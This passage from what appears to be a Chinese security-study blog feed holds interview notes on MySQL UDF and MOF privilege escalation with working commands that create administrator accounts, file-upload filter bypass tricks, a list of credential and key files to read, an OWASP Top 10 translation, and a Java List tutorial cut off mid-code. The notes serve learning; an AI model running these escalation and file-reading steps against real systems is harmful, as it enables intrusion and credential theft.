href="#子域名爆破中解决泛解析的方式" class="headerlink" title="子域名爆破中解决泛解析的方式"></a>子域名爆破中解决泛解析的方式</h3><p>目前最常见的解决方式是IP黑名单的方式，首先访问一个随机的并不存在的域，通过返回的结果判断是否存在泛解析，确定存在泛解析后，（脚本实现）不断的生成随机域名并发送请求，将每次返回的IP和TTL记录下来，直到大部分的IP出现次数都大于两次，则IP黑名单收集完成。而后使用域名字典进行爆破，爆破过程中根据IP黑名单进行过滤，同时比较TTL，在泛解析记录中TTL是相同的，如果TTL不相同，则不是泛解析记录。</p><h2 id="mysql两种提权方式"><a href="#mysql两种提权方式" class="headerlink" title="mysql两种提权方式"></a>mysql两种提权方式</h2><p>udf提权,mof提权</p><h3 id="Mysql-UDF提权"><a href="#Mysql-UDF提权" class="headerlink" title="Mysql_UDF提权"></a>Mysql_UDF提权</h3><p>要求:<br>1.目标系统是Windows(Win2000,XP,Win2003)；<br>2.拥有MYSQL的某个用户账号，此账号必须有对mysql的insert和delete权限以创建和抛弃函数<br>3.有root账号密码<br>导出udf:<br>MYSQL 5.1以上版本，必须要把udf.dll文件放到MYSQL安装目录下的lib\plugin文件夹下才能创建自定义函数<br>可以再mysql里输入<br><code>select @@basedir</code><br><code>show variables like ‘%plugins%’</code> 寻找mysql安装路径<br>提权:</p><p>使用SQL语句创建功能函数。语法：Create Function 函数名（函数名只能为下面列表中的其中之一）returns string soname ‘导出的DLL路径’；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create function cmdshell returns string soname ‘udf.dll’</span><br><span class="line">select cmdshell(‘net user arsch arsch /add’);</span><br><span class="line">select cmdshell(‘net localgroup administrators arsch /add’);</span><br><span class="line"></span><br><span class="line">drop function cmdshell;</span><br></pre></td></tr></table></figure><p>该目录默认是不存在的，这就需要我们使用webshell找到MYSQL的安装目录，并在安装目录下创建lib\plugin文件夹，然后将udf.dll文件导出到该目录即可。</p><h3 id="Mysql-mof提权"><a href="#Mysql-mof提权" class="headerlink" title="Mysql mof提权"></a>Mysql mof提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace = &quot;Root\\Cimv2&quot;;</span><br><span class="line">Name  = &quot;filtP2&quot;;</span><br><span class="line">Query = &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second = 5&quot;;</span><br><span class="line">QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name = &quot;consPCSV2&quot;;</span><br><span class="line">ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">ScriptText =</span><br><span class="line">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user waitalone waitalone.cn /add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer   = $Consumer;</span><br><span class="line">Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中的第18行的命令，上传前请自己更改。</p><p>2、执行load_file及into dumpfile把文件导出到正确的位置即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load file(&#x27;c:/wmpub/nullevt.mof&#x27;) into dumpfile &#x27;c:/windows/system32/wbem/mof/nullevt.mov&#x27;</span><br></pre></td></tr></table></figure><p>执行成功后，即可添加一个普通用户，然后你可以更改命令，再上传导出执行把用户提升到管理员权限，然后3389连接之就ok了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 面经 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>file-upload绕过</title>
      <link href="/2023/04/14/file-upload%E7%BB%95%E8%BF%87/"/>
      <url>/2023/04/14/file-upload%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/Untitled.png" alt="Untitled"></p><h2 id="前端校验"><a href="#前端校验" class="headerlink" title="前端校验"></a>前端校验</h2><p>前段校验，狗都防不了</p><h2 id="MIME验证"><a href="#MIME验证" class="headerlink" title="MIME验证"></a>MIME验证</h2><p>使用bp抓包，修改上传的content-type为image&#x2F;png</p><h2 id="文件内容头校验"><a href="#文件内容头校验" class="headerlink" title="文件内容头校验"></a><strong>文件内容头校验</strong></h2><p>主要是检测文件内容开始处的文件幻数</p><p>（1） .JPEG;.JPE;.JPG，”JPGGraphic File”</p><p>（2） .gif，”GIF 89A”</p><p>（3） .zip，”Zip Compressed”</p><p>（4） .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</p><h2 id="分析是否为黑名单或白名单"><a href="#分析是否为黑名单或白名单" class="headerlink" title="分析是否为黑名单或白名单"></a>分析是否为黑名单或白名单</h2><p>上传的后缀名写一个不存在的，如：<strong>shell.xxx</strong> 查看是否上传成功，成功为黑名单，失败为白名单</p><h2 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h2><ul><li>特殊后缀</li><li>大小写绕过</li><li>双重后缀</li><li>空格绕过</li><li>点号绕过</li><li>特殊字符::$DATA绕过</li><li>加点空格点<ul><li>上传shell.php 然后用bp改后缀加点空格点（即文件名为<code>shell.php. .</code>）</li><li>PS：补充知识：deldot()函数从后向前检测，当检测到末尾的第一个点时会继续它的检测，但是遇到空格会停下来</li></ul></li></ul><h2 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h2><ul><li><p>%00截断</p><blockquote><p>00截断原理是因为白名单判断的时候是判断后缀，在进行路径拼接的时候用的其他值，然后在进行move_uploaded_file的时候，这个函数读取到hex值为00的字符，认为读取结束，出现00截断。</p></blockquote><ul><li>get %00截断</li><li>post 00截断<ul><li>抓包，在hex处修改</li></ul></li></ul></li><li><p>图片马  PS：需文件包含漏洞配合</p></li></ul><div>  点击按钮下载博客:  <div style="display: flex;justify-content: center;">      <a href="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/md/file-upload%E7%BB%95%E8%BF%87.md">    <i class="fa fa-download fa-2x" aria-hidden="true"></i>    </a>  </div></div>]]></content>
      
      
      
        <tags>
            
            <tag> 安全 </tag>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>系统敏感文件</title>
      <link href="/2023/04/13/%E7%B3%BB%E7%BB%9F%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/"/>
      <url>/2023/04/13/%E7%B3%BB%E7%BB%9F%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Windows：</span><br><span class="line">   C:\boot.ini  <span class="comment">//查看系统版本</span></span><br><span class="line">   C:\Windows\System32\inetsrv\MetaBase.xml  <span class="comment">//IIS配置文件</span></span><br><span class="line">   C:\Windows\repair\sam  <span class="comment">//存储系统初次安装的密码</span></span><br><span class="line">   C:\Program Files\mysql\my.ini  <span class="comment">//Mysql配置</span></span><br><span class="line">   C:\Program Files\mysql\<span class="keyword">data</span>\mysql\user.MYD  <span class="comment">//Mysql root</span></span><br><span class="line">   C:\Windows\php.ini  <span class="comment">//php配置信息</span></span><br><span class="line">   C:\Windows\my.ini  <span class="comment">//Mysql配置信息</span></span><br><span class="line"></span><br><span class="line">Linux：</span><br><span class="line">   /root/.ssh/authorized_keys  <span class="comment">//SSH密钥对中的公钥列表</span></span><br><span class="line">   /root/.ssh/id_rsa  <span class="comment">//SSH密钥对中的私钥部分</span></span><br><span class="line">   /root/.ssh/id_ras.keystore</span><br><span class="line">   /root/.ssh/known_hosts  <span class="comment">//系统曾经连接过的 SSH 服务器主机的公钥</span></span><br><span class="line">   /etc/passwd  <span class="comment">// 账户信息</span></span><br><span class="line">   /etc/shadow  <span class="comment">// 账户密码文件</span></span><br><span class="line">   /etc/my.cnf  <span class="comment">// mysql 配置文件</span></span><br><span class="line">   /etc/httpd/conf/httpd.conf  <span class="comment">// Apache配置文件</span></span><br><span class="line">   /root/.bash_history  <span class="comment">//root用户历史命令</span></span><br><span class="line">   /root/.mysql_history  <span class="comment">//MySQL 历史命令</span></span><br><span class="line">   /proc/self/fd/fd[<span class="number">0</span>-<span class="number">9</span>]*(文件标识符)  <span class="comment">//进程的文件描述符</span></span><br><span class="line">   /proc/mounts  <span class="comment">//显示系统上挂载的文件系统的详细信息</span></span><br><span class="line">   /porc/config.gz  <span class="comment">// 是一个文件，通常在 Linux 系统中用于包含当前正在运行的内核的编译配置信息</span></span><br><span class="line">   /usr/local/app/apache2/conf/httpd.conf <span class="comment">// Apache2默认配置文件</span></span><br><span class="line">   /usr/local/app/apache2/conf/extra/httpd-vhost.conf <span class="comment">// 虚拟网站配置</span></span><br><span class="line">   /usr/local/app/php5/lib/php.ini <span class="comment">// PHP相关配置</span></span><br></pre></td></tr></table></figure><hr><p>不定时更新，就不放下载按钮了</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OWASP Top 10</title>
      <link href="/2023/04/13/OWASP-Top-10/"/>
      <url>/2023/04/13/OWASP-Top-10/</url>
      
        <content type="html"><![CDATA[<p>OWASP Top 10 是针对开发人员和 Web 应用程序安全性的标准意识文档。它代表了对 Web 应用程序最关键的安全风险的广泛共识。</p><p>开发人员在全球范围内将其视为迈向更安全编码的第一步。</p><p>公司应采用本文件并开始确保其网络应用程序将这些风险降至最低的过程。使用 OWASP Top 10 可能是将组织内的软件开发文化转变为生成更安全代码的文化的最有效的第一步。<br></p><h2 id="十大-Web-应用程序安全风险"><a href="#十大-Web-应用程序安全风险" class="headerlink" title="十大 Web 应用程序安全风险"></a>十大 Web 应用程序安全风险</h2><p>2021 年的前 10 名中有 3 个新类别、4 个更改了名称和范围的类别以及一些合并。</p><p><img src="https://github.com/OWASP/www-project-top-ten/raw/master/assets/images/mapping.png" alt="测绘"></p><ul><li><a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/"><strong>A01:2021-Broken Access  失效的访问控制</strong></a>从第五位上移；94% 的应用程序都针对某种形式的损坏访问控制进行了测试。映射到损坏的访问控制的 34 个常见弱点枚举 (CWE) 在应用程序中的出现次数比任何其他类别都多。</li><li><a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/"><strong>A02:2021-Cryptographic Failures 加密失败</strong></a>上升一位到第 2 位，以前称为敏感数据泄露，这是一个广泛的症状而不是根本原因。这里重新关注与密码学相关的故障，这些故障通常会导致敏感数据泄露或系统受损。</li><li><a href="https://owasp.org/Top10/A03_2021-Injection/"><strong>A03:2021-Injection 注射</strong></a>滑到第三个位置。94% 的应用程序针对某种形式的注入进行了测试，映射到该类别的 33 个 CWE 在应用程序中出现次数第二多。跨站点脚本现在是此版本中此类别的一部分。</li><li><a href="https://owasp.org/Top10/A04_2021-Insecure_Design/"><strong>A04:2021-Insecure Design 不安全的设计</strong></a>是 2021 年的一个新类别，重点关注与设计缺陷相关的风险。如果我们真的想作为一个行业“向左移动”，就需要更多地使用威胁建模、安全设计模式和原则以及参考架构。</li><li><a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"><strong>A05:2021-Security Misconfiguration 安全配置错误</strong></a>从上一版的#6 上移；90% 的应用程序都针对某种形式的错误配置进行了测试。随着越来越多的人转向高度可配置的软件，看到这一类别上升也就不足为奇了。以前的 XML 外部实体 (XXE) 类别现在属于此类别。</li><li><a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/"><strong>A06:2021-Vulnerable and Outdated Components 易受攻击和过时的组件</strong></a>之前的标题是使用具有已知漏洞的组件，在 Top 10 社区调查中排名第二，但也有足够的数据通过数据分析进入前 10 名。此类别从 2017 年的第 9 位上升，是我们努力测试和评估风险的已知问题。它是唯一没有将任何常见漏洞和暴露 (CVE) 映射到包含的 CWE 的类别，因此默认的漏洞利用和影响权重 5.0 被计入其分数。</li><li><a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/"><strong>A07:2021-Identification and Authentication Failures  认证和授权失败</strong></a>之前是Broken Authentication，从第二的位置往下滑，现在包括了更多与身份验证失败相关的CWEs。该类别仍然是前 10 名中不可或缺的一部分，但标准化框架的可用性增加似乎有所帮助。</li><li><a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"><strong>A08:2021-Software and Data Integrity Failures 软件和数据完整性故障</strong></a>是 2021 年的新类别，专注于在不验证完整性的情况下做出与软件更新、关键数据和 CI&#x2F;CD 管道相关的假设。Common Vulnerability and Exposures&#x2F;Common Vulnerability Scoring System (CVE&#x2F;CVSS) 数据映射到此类别的 10 个 CWE 的最高权重影响之一。2017 年的不安全反序列化现在是这个更大类别的一部分。</li><li><a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/"><strong>A09:2021-Security Logging and Monitoring Failures 安全日志记录和监控失败</strong></a>以前是 Insufficient Logging &amp; Monitoring，是从行业调查 (#3) 中添加的，从之前的 #10 上升。此类别已扩展以包括更多类型的故障，测试起来具有挑战性，并且在 CVE&#x2F;CVSS 数据中没有得到很好的体现。但是，此类故障会直接影响可见性、事件警报和取证。</li><li><a href="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_(SSRF)/"><strong>A10:2021-Server-Side Request Forgery 服务器请求伪造</strong></a>是从 Top 10 社区调查（#1）中添加的。数据显示发生率相对较低，测试覆盖率高于平均水平，以及利用和影响潜力的评级高于平均水平。此类别代表安全社区成员告诉我们这很重要的场景，即使此时数据中未说明这一点。</li></ul><p>以上内容摘抄自<a href="https://github.com/OWASP/www-project-top-ten/blob/master/index.md">官方</a>，翻译为谷歌翻译</p><div>  点击按钮下载博客:  <div style="display: flex;justify-content: center;">      <a href="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/md/OWASP-Top-10.md">    <i class="fa fa-download fa-2x" aria-hidden="true"></i>    </a>  </div></div>]]></content>
      
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>资源分享</title>
      <link href="/2022/11/08/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/"/>
      <url>/2022/11/08/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="资源大多是从网上找的到，侵权必删"><a href="#资源大多是从网上找的到，侵权必删" class="headerlink" title="资源大多是从网上找的到，侵权必删"></a>资源大多是从网上找的到，侵权必删</h1><h2 id="算法篇"><a href="#算法篇" class="headerlink" title="算法篇"></a>算法篇</h2><p><a href="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/md/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%955.0.pdf">数据结构和算法5.0.pdf</a></p><h2 id="网安篇"><a href="#网安篇" class="headerlink" title="网安篇"></a>网安篇</h2><p><a href="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/md/%E4%B9%A6%E7%B1%8D/2022%E7%B2%BE%E5%8D%8E%E7%89%88%E9%9D%A2%E8%AF%95%EF%BC%88%E8%AE%A2%E9%98%85%E5%8F%B7%EF%BC%9A0x00%E5%AE%9E%E9%AA%8C%E5%AE%A4%EF%BC%89.pdf">2022精华版面试（订阅号：0x00实验室）.pdf</a></p><p><a href="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/md/%E4%B9%A6%E7%B1%8D/cobaltstrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">cobaltstrike4.0用户手册_中文翻译.pdf</a></p><p><a href="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/md/%E4%B9%A6%E7%B1%8D/sqlilabs%E8%BF%87%E5%85%B3%E6%89%8B%E5%86%8C%E6%B3%A8%E5%85%A5%E5%A4%A9%E4%B9%A6.pdf">sqlilabs过关手册注入天书.pdf</a></p><p><a href="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/md/%E4%B9%A6%E7%B1%8D/web%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93.pdf">web中间件常见漏洞总结.pdf</a></p><p><a href="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/md/%E4%B9%A6%E7%B1%8D/web%E6%94%BB%E9%98%B2%E4%B9%8B%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97.pdf">web攻防之业务安全实战指南.pdf</a></p><p><a href="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/md/%E4%B9%A6%E7%B1%8D/xss%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF_it168%E6%96%87%E5%BA%93.pdf">xss绕过技术_it168文库.pdf </a></p><p><a href="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/md/%E4%B9%A6%E7%B1%8D/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88%E5%B8%A6%E7%8E%AF%E5%A2%83%E5%8F%8A%E8%A7%A3%E9%A2%98.pdf">未授权访问漏洞集合带环境及解题.pdf</a></p><p><a href="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/md/%E4%B9%A6%E7%B1%8D/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-linux%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95%E6%80%BB%E7%BB%93.pdf">权限提升-linux提权手法总结.pdf</a></p><p><a href="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/md/%E4%B9%A6%E7%B1%8D/%E7%B2%BE%E9%80%9A%E8%84%9A%E6%9C%AC%E9%BB%91%E5%AE%A2.pdf">精通脚本黑客.pdf</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 资源 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>List常用方法及遍历方式</title>
      <link href="/2022/09/19/List%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95%E5%8F%8A%E9%81%8D%E5%8E%86%E6%96%B9%E5%BC%8F/"/>
      <url>/2022/09/19/List%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95%E5%8F%8A%E9%81%8D%E5%8E%86%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220917154703328.png" alt="image-20220917154703328"></p><h3 id="List集合的特点"><a href="#List集合的特点" class="headerlink" title="List集合的特点"></a>List集合的特点</h3><ul><li>有序:存和取的元素顺序一致</li><li>有索引:可以通过索引操作元素</li><li>可重复:存储的元素可以重复</li></ul><p><img src="https://gmlblog.oss-cn-hangzhou.aliyuncs.com/img/image-20220917154745448.png" alt="image-20220917154745448"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        List系列集合独有的方法：</span></span><br><span class="line"><span class="comment">            void add(int index,E element)       在此集合中的指定位置插入指定的元素</span></span><br><span class="line"><span class="comment">            E remove(int index)                 删除指定索引处的元素，返回被删除的元素</span></span><br><span class="line"><span class="comment">            E set(int index,E element)          修改指定索引处的元素，返回被修改的元素</span></span><br><span class="line"><span class="comment">            E get(int index)                    返回指定索引处的元素</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.创建一个集合</span></span><br><span class="line">        List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.添加元素</span></span><br><span class="line">        list.add(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;bbb&quot;</span>);<span class="comment">//1</span></span><br><span class="line">        list.add(<span class="string">&quot;ccc&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//void add(int index,E element)       在此集合中的指定位置插入指定的元素</span></span><br><span class="line">        <span class="comment">//细节：原来索引上的元素会依次往后移</span></span><br><span class="line">        <span class="comment">//list.add(1,&quot;QQQ&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//E remove(int index)                 删除指定索引处的元素，返回被删除的元素</span></span><br><span class="line">        <span class="comment">//String remove = list.remove(0);</span></span><br><span class="line">        <span class="comment">//System.out.println(remove);//aaa</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//E set(int index,E element)          修改指定索引处的元素，返回被修改的元素</span></span><br><span class="line">        <span class="comment">//String result = list.set(0, &quot;QQQ&quot;);</span></span><br><span class="line">        <span class="comment">//System.out.println(result);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// E get(int index)                    返回指定索引处的元素</span></span><br><span class="line">        <span class="comment">//String s = list.get(0);</span></span><br><span class="line">        <span class="comment">//System.out.println(s);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.打印集合</span></span><br><span class="line">        System.out.println(list);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="List删除方法"><a href="#List删除方法" class="headerlink" title="List删除方法"></a>List删除方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//List系列集合中的两个删除的方法</span></span><br><span class="line">        <span class="comment">//1.直接删除元素</span></span><br><span class="line">        <span class="comment">//2.通过索引进行删除</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.创建集合并添加元素</span></span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        list.add(<span class="number">1</span>);</span><br><span class="line">        list.add(<span class="number">2</span>);</span><br><span class="line">        list.add(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.删除元素</span></span><br><span class="line">        <span class="comment">//请问：此时删除的是1这个元素，还是1索引上的元素？</span></span><br><span class="line">        <span class="comment">//为什么？</span></span><br><span class="line">        <span class="comment">//因为在调用方法的时候，如果方法出现了重载现象</span></span><br><span class="line">        <span class="comment">//优先调用，实参跟形参类型一致的那个方法。</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//list.remove(1);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//手动装箱，手动把基本数据类型的1，变成Integer类型</span></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> Integer.valueOf(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        list.remove(i);</span><br><span class="line"></span><br><span class="line">        System.out.println(list);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="List集合的遍历方式"><a href="#List集合的遍历方式" class="headerlink" title="List集合的遍历方式"></a>List集合的遍历方式</h3><ul><li>迭代器遍历</li><li>列表迭代器遍历</li><li>增强for遍历</li><li>Lambda表达式遍历</li><li>普通for循环(因为List集合存在索引)</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="comment">/*</span></span><br><span class="line"><span class="comment">           List系列集合的五种遍历方式：</span></span><br><span class="line"><span class="comment">               1.迭代器</span></span><br><span class="line"><span class="comment">               2.列表迭代器</span></span><br><span class="line"><span class="comment">               3.增强for</span></span><br><span class="line"><span class="comment">               4.Lambda表达式</span></span><br><span class="line"><span class="comment">               5.普通for循环</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="comment">//创建集合并添加元素</span></span><br><span class="line">       List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">       list.add(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">       list.add(<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">       list.add(<span class="string">&quot;ccc&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//1.迭代器</span></span><br><span class="line">       <span class="comment">/*Iterator&lt;String&gt; it = list.iterator();</span></span><br><span class="line"><span class="comment">       while(it.hasNext())&#123;</span></span><br><span class="line"><span class="comment">           String str = it.next();</span></span><br><span class="line"><span class="comment">           System.out.println(str);</span></span><br><span class="line"><span class="comment">       